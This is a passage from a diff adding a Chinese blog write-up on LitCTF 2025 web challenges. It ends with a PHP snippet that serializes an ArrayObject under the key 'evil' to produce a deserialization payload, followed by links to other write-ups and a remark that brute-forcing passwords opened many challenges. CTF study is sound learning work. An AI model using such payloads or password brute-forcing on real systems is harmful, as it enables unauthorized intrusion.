+</span></span><span class="line"><span class="cl"><span class="nv">$arr</span><span class="o">=</span><span class="k">array</span><span class="p">(</span><span class="s2">&#34;evil&#34;</span><span class="o">=&gt;</span><span class="nv">$a</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$d</span><span class="o">=</span><span class="k">new</span> <span class="nx">ArrayObject</span><span class="p">(</span><span class="nv">$arr</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="k">echo</span> <span class="nx">urlencode</span><span class="p">(</span><span class="nx">serialize</span><span class="p">(</span><span class="nv">$d</span><span class="p">));</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><a class="link" href="https://www.cnblogs.com/TouHp/p/18895822#gallery-7"  target="_blank" rel="noopener"
+    >2025LitCTF&ndash;web全解 - TouHp - 博客园</a></p>
+<p><a class="link" href="https://www.cnblogs.com/Litsasuk/articles/18896993"  target="_blank" rel="noopener"
+    >Litctf2025-君の名はwp - Litsasuk - 博客园</a></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">至此，web复现完，这里许多题都是爆破用户密码开路，之后还得多爆破爆破，然后就是考的很细，题目的提示得多看看，要耐住性子做题
+</span></span></code></pre></td></tr></table>
+</div>
+</div>
 </section>
 
 
